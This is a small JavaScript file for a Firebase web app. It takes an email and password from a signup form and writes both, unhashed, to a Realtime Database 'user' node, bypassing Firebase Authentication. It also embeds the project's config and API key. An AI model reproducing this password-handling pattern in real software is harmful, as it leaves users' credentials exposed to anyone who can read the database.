// Your web app's Firebase configuration
var firebaseConfig = {
    apiKey: "AIzaSyBLQKf6mI8NDai8MaiWsothpn2qO1qa9Ks",
    authDomain: "lol-project-5be56.firebaseapp.com",
    databaseURL: "https://lol-project-5be56.firebaseio.com",
    projectId: "lol-project-5be56",
    storageBucket: "lol-project-5be56.appspot.com",
    messagingSenderId: "485034451959",
    appId: "1:485034451959:web:f385c56c8eda9224e204f2"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  var messagesRef = firebase.database().ref('user');



document.getElementById('signupFrom').addEventListener('submit', submitForm);

function submitForm(e){
e.preventDefault();

var email = getInputVal('email');
var password = getInputVal('password');


saveMessage(email, password);

document.querySelector('.alert').style.display = 'block';

// Hide alert after 3 seconds
setTimeout(function(){
  document.querySelector('.alert').style.display = 'none';
},3000);

// Clear form
document.getElementById('signupFrom').reset();

}

function getInputVal(id){
return document.getElementById(id).value;

}

function saveMessage(email, password){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
        
        email: email,
        password: password,
        


    });
}